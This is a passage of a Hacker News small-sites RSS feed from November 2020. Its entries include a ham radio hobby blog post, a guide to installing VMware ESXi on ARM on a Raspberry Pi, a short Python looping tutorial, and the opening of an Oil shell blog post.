November 8, 2020 | https://www.toruspower.com/toroidal-transformers/ | <a href="https://web.archive.org/web/*/https://www.toruspower.com/toroidal-transformers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.toruspower.com/toroidal-transformers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25029498</guid>
            <pubDate>Sun, 08 Nov 2020 22:01:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I Took a Break from Ham Radio and Why I Came Back]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25029459">thread link</a>) | @parsecs
<br/>
November 8, 2020 | https://www.kj7nzl.net/blog/3-reasons-why-i-took-a-break-from-ham-radio-why-i-came-back/ | <a href="https://web.archive.org/web/*/https://www.kj7nzl.net/blog/3-reasons-why-i-took-a-break-from-ham-radio-why-i-came-back/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content-pane">
  <div>
    
    <p>About three months ago I unconsciously or perhaps consciously lost interest in ham radio. This isn’t the first time this has happened to me, in fact this was what lead me to allow my license to lapse the first time in 2016. If it weren’t for a new coworker of mine showing interest in ham radio again after a twenty-five year absent; I presumably wouldn’t be writing this post now. His excitement about all of the recent advances that have been made since he was first license reminded me of the things I missed about ham radio. This forced me to reflect on the reasons that I stepped away from the hobby for nearly three months. After some time I narrowed it down to three primary reasons. Without further ado I present to you my three reasons I took a break from ham radio.</p>
<h2 id="1-2020-amsat-board-of-directors-election">1. 2020 AMSAT Board of Directors Election</h2>
<p>I love satellite operations! It was my primary reason for returning to the hobby earlier this year. Shortly after becoming licensed I joined AMSAT to support amateur radio in space. Little did I know there was an ongoing dispute among two newly elected board members and the rest of the board of directors. Apparently the dispute was over the access of to AMSAT’s finical records with the lengthy ordeal playing out like some pollical scandal with lawyers and secret audio recordings. The board of directors went as far as <a href="https://www.amsat.org/amsat-leadership-explains-2018-2020-legal-expenses/">releasing a statement</a> that was full of contempt for the two new directors. In turn Patrick Stoddard WD9EWK, one of the individuals at that center of this controversy <a href="http://amsat.wd9ewk.net/">released his own statement</a> on the events that transpired. All of this drama culminated with those who sided with Mr. Stoddard attempting replace three of the existing board members with there of their own candidates. Ultimately they were unsuccessful in their coup attempt, and I’ve exhausted all interest in being a part of AMSAT.</p>
<figure>
    <img src="https://www.kj7nzl.net/img/satellites/amsat-fm-0001.webp" alt="KJ7NZL working AO-92."> <figcaption>
            <p>KJ7NZL working AO-92</p>
        </figcaption>
</figure>

<h2 id="2-limited-radio-budget--limited-operating-options">2. Limited Radio Budget = Limited Operating Options</h2>
<p>Whether you want to admit it or not, ham radio is an expensive hobby. Sure you can purchase a Baofeng handheld for thirty-five dollars, but to really take advantage of all your license privileges you need to shell out some cold hard cash for either an HF rig or an all mode VHF/UHF radio. Initially, I wanted to get on the air as quickly and cheaply as possible to try my hand at working a few of the FM satellites, as a result I purchased an Arrow Antenna II and the Wouxun KG-UV8D Plus. To make a long story short, the Wouxun radio was garbage. Don’t believe me <a href="https://www.kj7nzl.net/blog/wouxun-kg-uv8d-plus-fm-satellites/">check out my review of the Wouxun KG-UV8D Plus</a>. After some time of fooling around with that dumb thing, I decided to purchase a Yaesu FT3D and I’m glad I did. On a side note, I should absolutely do a review of that thing since I’ve had it for about three months now and I’ve explored most everything the radio has to offer. With the KG-UV8D I was limited in how I could operate. With just supporting FM I really only could use the thing for satellites outside of using it to connect to any of the local repeaters in the area. On the other hand the Yaesu FT3D allowed me the ability to expore APRS and C4FM AKA System Fussion. This however came at the cost of three times the price of the KG-UV8D. All told, even after selling my KG-UV8D, I am about $600 into the hobby with an Arrow Antenna II, Yaesu FT3D, and Comet Dual Band HT antenna. Even with this setup I’m only able play around with FM satellites, APRS, and simplex/repeaters. I would have loved exploring some of the other areas of the hobby when I jumped back in the spring of this year, but discretionary funds were spread out among different things at the time.</p>
<figure>
    <img src="https://www.kj7nzl.net/img/aprs/aprs-001.webp" alt="KJ7NZL's Trip to Antelope Island State Park"> <figcaption>
            <p>KJ7NZL’s Trip to Antelope Island State Park</p>
        </figcaption>
</figure>

<h2 id="3-life-just-got-in-the-way">3. Life Just Got in the Way</h2>
<p>This year 2020 has been an unusual year for me. Between a global pandemic and finishing some of my basement, I’ve been very busy. As a result I’ve had little free time. What free time I’ve possessed has been divided between multiple hobbies with amateur radio taking a back seat most of the time. It’s my own fault really since I set out earlier this year with the goal of exclusively working FM satellites. I initial assumed it would be effortless to make time through out my day for a quick ten to fifteen minute pass. It made sense at the time; take a brief break, make a couple of contacts, and back to what I was doing before hand. But it turns out that FM satellite QSOs are hard work This in turn lead me to get frustrated very quickly and wish I could operate at my own pace whenever I felt like it. Just so you know, rarely do two FM satellite passes line up back to back when you want them two giving you a thirty to forty minute window of time in which to have fun. Looking back on my journey into ham radio, both the first time and second time, I should have just gone the HF route from the get go. Since I didn’t, I feel like I set myself up for disappointment. With very little motivation and other competing priorities it’s no wonder why I stepped away from ham radio as long I did.</p>
<figure>
    <img src="https://www.kj7nzl.net/img/radios/yaesu-ftdx-3000.webp" alt="Yaesu FTDX 3000"> <figcaption>
            <p>Yaesu FTDX 3000</p>
        </figcaption>
</figure>

<h3 id="moving-forward">Moving Forward</h3>
<p>So what does the future hold for me now that I’m interested in ham radio again? Well, Santa is coming to town, and he’s going to have a new Yaesu FTDX 3000 wrapped up under three for me. I’ll finally be able to dive head first into the world of HF. I have some ambitious plans too. I’d like to explore some of the lesser used digital modes like Hellschreiber, Olivia, and Contestia. I’ll still jump on the FT8 bandwagon, but ultimately I want to explore all the digital modes. I also want to <a href="https://www.kj7nzl.net/blog/learning-morse-code-series/">learn morse code</a>, which I’ve unsuccessfully started and begin working som CW. The Yaesu FTDX 3000 contains some exceptionally attractive features for CW operations that I really want to take advantage of. Another area that I’m going to focus on coming up soon will be building a MMDVM hotspot. Sure I could merely purchase a prebuilt one, but what the fun in that? All in all I think the rest of this year and next year is shaping up to be a excellent time for me to get back into ham radio.</p>

  </div>
</section></div>]]>
            </description>
            <link>https://www.kj7nzl.net/blog/3-reasons-why-i-took-a-break-from-ham-radio-why-i-came-back/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25029459</guid>
            <pubDate>Sun, 08 Nov 2020 21:56:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Started with VMware ESXi on ARM with a Raspberry Pi]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25029404">thread link</a>) | @todsacerdoti
<br/>
November 8, 2020 | https://www.servethehome.com/getting-started-with-vmware-esxi-on-arm-with-a-raspberry-pi/ | <a href="https://web.archive.org/web/*/https://www.servethehome.com/getting-started-with-vmware-esxi-on-arm-with-a-raspberry-pi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151735.jpg" data-caption="Raspberry Pi"><img width="696" height="522" src="https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151735-696x522.jpg" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151735-696x522.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151735-400x300.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151735-800x600.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151735-1068x801.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151735-560x420.jpg 560w, https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151735-80x60.jpg 80w, https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151735-265x198.jpg 265w, https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151735.jpg 1163w" sizes="(max-width: 696px) 100vw, 696px" alt="Raspberry Pi" title="Raspberry Pi"></a><figcaption>Raspberry Pi</figcaption></figure></div>
            <!-- content --><p>Last month VMWare released what they have called <a href="https://blogs.vmware.com/vsphere/2020/10/announcing-the-esxi-arm-fling.html">ESXi Arm-fling.</a> This new release allows you to install the same ESXi you know and love on an ARM processor. VMWare has certified a few systems for datacenter use. They also have certified it for the Raspberry Pi 4, but only for what they call “Far Edge”.</p>
<p>Today we are going to perform the installation on a Raspberry Pi 8GB and do some testing. While we generally feel <a href="https://www.servethehome.com/introducing-project-tinyminimicro-home-lab-revolution/">ProjectTinyMiniMicro</a> may be a better option for some, there are many enthusiasts who sing the praises of the Raspberry Pi. The Pi has exceptional power efficiency, scalability, and a small footprint.<span id="more-48249"></span></p>
<figure id="attachment_48251" aria-describedby="caption-attachment-48251"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151215-1-800x670.jpg" alt="Raspberry Pi 4" width="696" height="583" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151215-1-800x670.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151215-1-358x300.jpg 358w, https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151215-1-696x583.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151215-1-502x420.jpg 502w, https://www.servethehome.com/wp-content/uploads/2020/11/IMG_20201107_151215-1.jpg 1014w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-48251">Raspberry Pi 4 CanaKit and a LovePI PoE HAT</figcaption></figure>
<p>Before we continue, it is worth noting that this installation is a little bit different than other Raspberry Pi installations. We will need a total of <strong>three</strong> different pieces of storage to complete this installation. You need a microSD card for the firmware, but in this guide that is ALL the microSD card will be used for. Then you will need a USB thumb drive to act as your VMWare installer. Finally, you will need a place to install VMWare to. While it is possible to install it to your microSD card, that is not officially supported. Instead, you want to look at a USB based solution or a network solution such as PXE or iSCSI.</p>
<h2>Preparing our Pi for ESXi</h2>
<p>You will need to grab the<a href="https://www.raspberrypi.org/downloads/noobs/"> NOOBS </a>image and&nbsp;burn it to your microSD card if you did not buy a kit with it preinstalled as we had. To do so you can utilize the <a href="https://www.raspberrypi.org/downloads/">Raspberry Pi Imager</a>.</p>
<p>When the NOOBs installer boots up, select the Raspberry Pi OS Lite (32-bit) option. You do not need the full desktop version. We are only using the OS to update the EEPROM and get some other updates out of the way.</p>
<figure id="attachment_48252" aria-describedby="caption-attachment-48252"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/NOOBS-800x501.png" alt="N" width="696" height="436" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/NOOBS-800x501.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/NOOBS-400x251.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/NOOBS-696x436.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/NOOBS-670x420.png 670w, https://www.servethehome.com/wp-content/uploads/2020/11/NOOBS.png 921w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-48252">NOOBS Selecting Raspberry Pi OS 32-bit</figcaption></figure>
<p>When the installation is completed, run the following commands:</p>
<pre><code>sudo rpi-eeprom-update -a
sudo reboot</code></pre>
<p>After you have completed the EEPROM update, we need to now update the firmware and switch to the community UEFI firmware. First, start by going to the Raspberry Pi <a href="https://github.com/raspberrypi/firmware">Github page</a> and download the latest firmware. Next, go to pftf’s UEFI <a href="https://github.com/pftf/RPi4">Github page</a>, and download it as well.</p>
<p>Safely shutdown your Pi and take the microSD card out. Next, plug your microSD card into a computer and prepare to update the files on it. To get started, we need to format the RECOVERY partition and rename it UEFI:</p>
<figure id="attachment_48259" aria-describedby="caption-attachment-48259"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/format.png" alt="Format" width="251" height="460" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/format.png 251w, https://www.servethehome.com/wp-content/uploads/2020/11/format-164x300.png 164w, https://www.servethehome.com/wp-content/uploads/2020/11/format-229x420.png 229w" sizes="(max-width: 251px) 100vw, 251px"><figcaption id="caption-attachment-48259">SD CARD Format for UEFI</figcaption></figure>
<p>Next, drag and drop the new files from the <strong>boot folder in the firmware-master</strong> onto the <strong>SD card</strong>. Start by going to the firmware-master folder and selecting everything. Once completed, you must remove the four files starting with the name “kernel”:</p>
<figure id="attachment_48260" aria-describedby="caption-attachment-48260"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/kernel.png" alt="Kernel" width="605" height="87" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/kernel.png 605w, https://www.servethehome.com/wp-content/uploads/2020/11/kernel-400x58.png 400w" sizes="(max-width: 605px) 100vw, 605px"><figcaption id="caption-attachment-48260">VMware ESXi Raspberry Pi Kernel in firmware-master</figcaption></figure>
<p>Next, do the same thing for the files from the <strong>UEFI firmware</strong>. Make sure you <strong>replace/overwrite</strong>&nbsp;the files with the updated ones.</p>
<figure id="attachment_48255" aria-describedby="caption-attachment-48255"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/UEFI-800x347.png" alt="UEFI" width="696" height="302" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/UEFI-800x347.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/UEFI-400x173.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/UEFI-1536x666.png 1536w, https://www.servethehome.com/wp-content/uploads/2020/11/UEFI-696x302.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/UEFI-1068x463.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/UEFI-969x420.png 969w, https://www.servethehome.com/wp-content/uploads/2020/11/UEFI.png 1829w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-48255">VMware ESXi Raspberry Pi UEFI Setup</figcaption></figure>
<p>Now, open the config.txt file in the UEFI drive. We need to modify it by adding a line</p>
<pre><code>gpu_mem=32</code></pre>
<p>You can now put the SD card back into your RPI.</p>
<h2>Setting up ESXi for ARM</h2>
<p>To get started you will need to navigate to <a href="https://flings.vmware.com/esxi-arm-edition#summary">VMware’s page</a> for ESXi for ARM. Once there you will need to create an account and download the ISO. You will need to burn this ISO to a separate USB thumb drive. To burn it to the drive, you can utilize <a href="https://rufus.ie/">Rufus</a>.</p>
<figure id="attachment_48258" aria-describedby="caption-attachment-48258"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/esxi.png" alt="Esxi" width="352" height="485" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/esxi.png 419w, https://www.servethehome.com/wp-content/uploads/2020/11/esxi-218x300.png 218w, https://www.servethehome.com/wp-content/uploads/2020/11/esxi-305x420.png 305w" sizes="(max-width: 352px) 100vw, 352px"><figcaption id="caption-attachment-48258">Rufus Esxi for Raspberry Pi</figcaption></figure>
<p>After you have burned the ISO to your thumb drive, you need to plug it into your Pi and turn it on. You will see a new UEFI boot menu, press escape, and get into the UEFI to make any changes.</p>
<p>Click on&nbsp;<strong>Device Manager&nbsp;</strong>and then click <strong>Limit Ram to 3GB</strong> and change it to <strong>Disabled</strong>.</p>
<figure id="attachment_48262" aria-describedby="caption-attachment-48262"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Unlimited-RAM-800x557.png" alt="Unlimited RAM" width="696" height="485" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Unlimited-RAM-800x557.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Unlimited-RAM-400x279.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Unlimited-RAM-696x485.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Unlimited-RAM-603x420.png 603w, https://www.servethehome.com/wp-content/uploads/2020/11/Unlimited-RAM-100x70.png 100w, https://www.servethehome.com/wp-content/uploads/2020/11/Unlimited-RAM.png 1034w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-48262">Unlimited RAM</figcaption></figure>
<p>Press <strong>F10</strong> and save the change you made. Exit the UEFI and press <strong>Enter</strong> to boot to the USB drive. The system will then boot into the ESXi installer. One option for installing ESXi to an SSD, using something like a <a href="https://www.amazon.com/StarTech-com-SATA-USB-Cable-USB3S2SAT3CB/dp/B00HJZJI84/ref=sr_1_1_sspa?dchild=1&amp;keywords=usb+to+sata+startech&amp;qid=1604788276&amp;sr=8-1-spons&amp;psc=1&amp;spLa=ZW5jcnlwdGVkUXVhbGlmaWVyPUEySDJEUE9JUUgxQzlQJmVuY3J5cHRlZElkPUEwNTM2MTQ1RDA0VFA3V0lJUUZYJmVuY3J5cHRlZEFkSWQ9QTA3MzMzOTgzUzAwNTNCQkxWSk9XJndpZGdldE5hbWU9c3BfYXRmJmFjdGlvbj1jbGlja1JlZGlyZWN0JmRvTm90TG9nQ2xpY2s9dHJ1ZQ==">Startech USB3.0 to SATA adapter</a>. Another option is to install it to another USB thumb drive and use iSCSI storage for your VMs.</p>
<figure id="attachment_48263" aria-describedby="caption-attachment-48263"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/SSD-800x600.jpg" alt="SSD" width="696" height="522" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/SSD-800x600.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/11/SSD-400x300.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/11/SSD-696x522.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/11/SSD-560x420.jpg 560w, https://www.servethehome.com/wp-content/uploads/2020/11/SSD-80x60.jpg 80w, https://www.servethehome.com/wp-content/uploads/2020/11/SSD-265x198.jpg 265w, https://www.servethehome.com/wp-content/uploads/2020/11/SSD.jpg 1000w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-48263">Intel DC S3500 SATA SSD with StarTech USB adapter</figcaption></figure>
<p>Select your disk, it has to be one other than the USB installer drive or the microSD card. Once you have selected your disk, the installer will format it and destructively remove all data. You need only to assign a password and installation will begin. When you are done, simply remove the installation media and reboot.</p>
<h2>Getting Started in VMware ESXi on the Pi</h2>
<p>To get started, open a web browser on another computer and point it to the IP of your Pi. Once there, you should see the familiar ESXi home page. For more information on setting up ESXi, please see our <a href="https://www.servethehome.com/building-a-lab-part-3-configuring-vmware-esxi-and-truenas-core/">Building a Lab series</a>.</p>
<figure id="attachment_48264" aria-describedby="caption-attachment-48264"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/esxi-home-800x450.png" alt="Esxi Home" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/esxi-home-800x450.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/esxi-home-400x225.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/esxi-home-696x392.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/esxi-home-1068x601.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/esxi-home-746x420.png 746w, https://www.servethehome.com/wp-content/uploads/2020/11/esxi-home.png 1276w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-48264">VMware Esxi Home with VMware ESXi on Arm Fling Label</figcaption></figure>
<p>The first step we should do is to add our NTP servers. Go to&nbsp;<strong>Manage&nbsp;</strong>then to <strong>System</strong><strong>&nbsp;</strong>and finally to <strong>Time and Date. </strong>Add some NTP servers, then click on&nbsp;<strong>Services&nbsp;</strong>and start the <strong>ntpd</strong> service.</p>
<figure id="attachment_48265" aria-describedby="caption-attachment-48265"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/time-and-date-800x399.png" alt="Time And Date" width="696" height="347" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/time-and-date-800x399.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/time-and-date-400x200.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/time-and-date-696x347.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/time-and-date-842x420.png 842w, https://www.servethehome.com/wp-content/uploads/2020/11/time-and-date.png 1034w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-48265">VMware ESXi on Arm Fling Time And Date</figcaption></figure>
<p>If you wanted to add iSCSI storage you can. For my testing, I added a 1TiB iSCSI LUN from my production TrueNAS Core box.</p>
<figure id="attachment_48267" aria-describedby="caption-attachment-48267"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/iscsi-800x256.png" alt="Iscsi" width="696" height="223" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/iscsi-800x256.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/iscsi-400x128.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/iscsi-696x223.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/iscsi-1068x342.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/iscsi.png 1281w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-48267">VMware ESXi on Arm Fling iSCSI</figcaption></figure>
<p>Additionally, you can add it to a vCenter just like a normal ESXi host. You simply right-click on a datacenter, press <strong>A</strong><strong>dd Host,&nbsp;</strong>type your IP address, credentials and select a license.</p>
<figure id="attachment_48266" aria-describedby="caption-attachment-48266"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/vsphere-800x402.png" alt="Vsphere" width="696" height="350" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/vsphere-800x402.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/vsphere-400x201.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/vsphere-696x349.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/vsphere-1068x536.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/vsphere-837x420.png 837w, https://www.servethehome.com/wp-content/uploads/2020/11/vsphere.png 1281w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-48266">VMware ESXi on Arm Fling vSphere</figcaption></figure>
<p>At this point, you are basically ready to get going with the VMware ESXi on Arm Fling using your Raspberry Pi.</p>
<h2>A Word on Some Limitations</h2>
<p>There are some limitations to this setup, however. As one example, ESXi on Arm cannot run X86 compatible operating systems. As a result, you will not be able to install Windows in the traditional sense. At this time Windows 10 for ARM is not supported. You will be able to install operating systems compiled for Arm, however. As a result, we see Ubuntu Server being a more popular guest OS than Windows Server.</p>
<p>Using ESXi on a Raspberry Pi in conjunction with something like Kubernetes makes for an interesting solution, however. This gives us tinkerers the ability to build an entire three node cluster on a single Raspberry Pi. While I certainly would not suggest doing this in production, it is a fantastic opportunity for learning and development.</p>
<h2>Final Words</h2>
<p>As Patrick stated in his piece <a href="https://www.servethehome.com/of-bbq-and-virtualization-large-nodes/">of BBQ and Virtualization</a>, large nodes make sense. With the advent of ESXi on Arm, we get to look at the other side of that picture. If you need a highly available solution for a lightweight application, you can use a cluster of Raspberry Pis to build a vSAN capable of obtaining that goal. Alternatively, if you are new to this world and just trying to learn, having ESXi available gives you access to what is used in the enterprise.</p>
<p>One of the coolest possibilities for this platform is for the Raspberry Pi to become a witness node for a cluster in vCenter. If you have two production x86 servers and are planning to build a vSAN, a RaspberryPi can be added as a witness node. This will effectively save you a ton of money by not having to buy a full-blown third server. Using a small node like this in the future can lower both up-front as well as operating costs over time due to the low power consumption. A note of warning, however. That is not an officially supported topology by VMWare, but it is certainly interesting! For those using other virtualization setups such as standard KVM on Linux clusters, this is a great use case as well.</p>
<figure id="attachment_47443" aria-describedby="caption-attachment-47443"><a href="https://www.servethehome.com/nvidia-bluefield-2-and-bluefield-2x-dpu-offerings-launched/nvidia-dpu-roadmap/" rel="attachment wp-att-47443"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/10/NVIDIA-DPU-Roadmap.jpg" alt="NVIDIA DPU Roadmap" width="1721" height="911" srcset="https://www.servethehome.com/wp-content/uploads/2020/10/NVIDIA-DPU-Roadmap.jpg 1721w, https://www.servethehome.com/wp-content/uploads/2020/10/NVIDIA-DPU-Roadmap-400x212.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/10/NVIDIA-DPU-Roadmap-800x423.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/10/NVIDIA-DPU-Roadmap-1536x813.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/10/NVIDIA-DPU-Roadmap-696x368.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/10/NVIDIA-DPU-Roadmap-1068x565.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/10/NVIDIA-DPU-Roadmap-793x420.jpg 793w" sizes="(max-width: 1721px) 100vw, 1721px"></a><figcaption id="caption-attachment-47443"><a href="https://www.servethehome.com/nvidia-shows-dpu-roadmap-combining-arm-cores-gpu-and-networking/">NVIDIA DPU</a> Roadmap</figcaption></figure>
<p>With Apple switching to Arm, NVIDIA looking to <a href="https://www.servethehome.com/nvidia-to-acquire-arm-in-major-shift/">acquire</a> Arm, and <a href="https://www.servethehome.com/an-arm-opportunity-with-cloud-service-providers/2/">Cloud Providers</a> looking more at Arm, VMWare has made a strong move here. To be clear, it needed to do this as it was falling behind in the edge. Likewise, VMware is many years behind Amazon AWS in the <a href="https://www.servethehome.com/what-is-a-dpu-a-data-processing-unit-quick-primer/">DPU</a> architecture but is catching up with <a href="https://www.servethehome.com/vmware-project-monterey-esxi-on-arm-on-dpu/">VMware Project Monterey ESXi on Arm on DPU</a>. It may be harder to buy a DPU today to work with ESXi on Arm, but it is relatively low-cost to simply get a Raspberry Pi. I am personally excited to see what happens next.</p>
        </div></div>]]>
            </description>
            <link>https://www.servethehome.com/getting-started-with-vmware-esxi-on-arm-with-a-raspberry-pi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25029404</guid>
            <pubDate>Sun, 08 Nov 2020 21:49:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Looping Techniques]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25029363">thread link</a>) | @janprincek
<br/>
November 8, 2020 | https://www.pythonstacks.com/blog/looping-techniques/ | <a href="https://web.archive.org/web/*/https://www.pythonstacks.com/blog/looping-techniques/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>In this short tutorial, you will learn how to use loops more effectively in different situations.</span><br>
&nbsp;</p>

<h3><span>Looping over two lists at the same time</span><p>

<span>There are some moments in coding, where you would be required to <span>iterate/loop over two lists</span> or sequences at the <span>same time.</span></span></p></h3>

<p><span>This can be achieved using the <code>zip()</code> function.</span></p>

<pre><code>colors = ["red", "blue", "white"]
types = ["warm", "cool", "neutral"]

for c, t in zip(colors, types):
    print(c + " is " + t)</code></pre>

<p><span><strong>Program Output:</strong></span></p>

<pre><code>red is warm
blue is cool
white is neutral</code></pre>





<h3><span>The <span>enumerate()</span> function.</span></h3>

<p><span>When looping through a sequence (lists, tuple, string, etc), the <span>position index</span> and <span>corresponding value </span>can be retrieved at the <span>same time</span> using the <code>enumerate()</code> function.</span></p>

<pre><code>colors = ["orange", "brown", "indigo", "black"]

for i, v in enumerate(colors):
    print(i , v)</code></pre>

<p><span><strong>Program Output:</strong></span></p>

<pre><code>0 orange
1 brown
2 indigo
3 black</code></pre>



<p><span>The <code>enumerate()</code> function returns individual elements in the list with their <span>indexes</span>.</span></p>





<h3><span>Looping through a dictionary with the<span> items()</span> method</span><span>.</span><br>
&nbsp;</h3>

<p><span>We can get both the keys and the corresponding values when looping over a dictionary by using the <code>items()</code> method.</span></p>

<pre><code>grades = {'Ana': 'B', 'John':'A+', 'Denise':"A", "katy": 'A'}

for name, g in grades.items():
    print(name + " had " + g)</code></pre>

<p><span><strong>Program Output:</strong></span></p>

<pre><code>Ana had B
John had A+
Denise had A
katy had A</code></pre>





<h3><span>Reverse looping.</span><br>
&nbsp;</h3>

<p><span>To loop over a range of numbers in reverse, first, specify the range and then call the <code>reversed()</code> function.</span></p>

<pre><code>for r in reversed(range(7)):
    print(r)</code></pre>

<p><span><strong>Program Output:</strong></span></p>

<pre><code>6
5
4
3
2
1
0</code></pre>



<p><em><span>The same analogy applies to looping over a list in reverse:</span></em></p>

<pre><code>colors = ["blue", "red", "black", "yellow"]

for i in reversed(colors):
    print(i)</code></pre>

<p><span><strong>Program Output:</strong></span></p>

<pre><code>yellow
black
red
blue</code></pre>








        </div></div>]]>
            </description>
            <link>https://www.pythonstacks.com/blog/looping-techniques/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25029363</guid>
            <pubDate>Sun, 08 Nov 2020 21:44:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[More Changes to Oil's Syntax]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25029243">thread link</a>) | @todsacerdoti
<br/>
November 8, 2020 | http://www.oilshell.org/blog/2020/11/more-syntax.html | <a href="https://web.archive.org/web/*/http://www.oilshell.org/blog/2020/11/more-syntax.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  <!-- INSERT LATCH HTML -->
<p><a href="http://www.oilshell.org/blog/">blog</a> | <a href="http://www.oilshell.org/">oilshell.org</a></p>

<p>
  2020-11-08
</p>
<p>The recent <a href="http://www.oilshell.org/release/0.8.3/">0.8.3</a> and <a href="http://www.oilshell.org/release/0.8.4/">0.8.4</a> releases were
so big that it's taking <strong>five blog posts</strong> to describe them!</p>
<ol>
<li><a href="http://www.oilshell.org/blog/2020/10/big-changes.html">Big Changes to the Oil Language</a>: I published this
post about the expression language a couple weeks ago.</li>
<li><em>More Changes to Oil's Syntax</em>.  <strong>This post</strong> describes more syntactic
changes, including enhancements to shell builtins.</li>
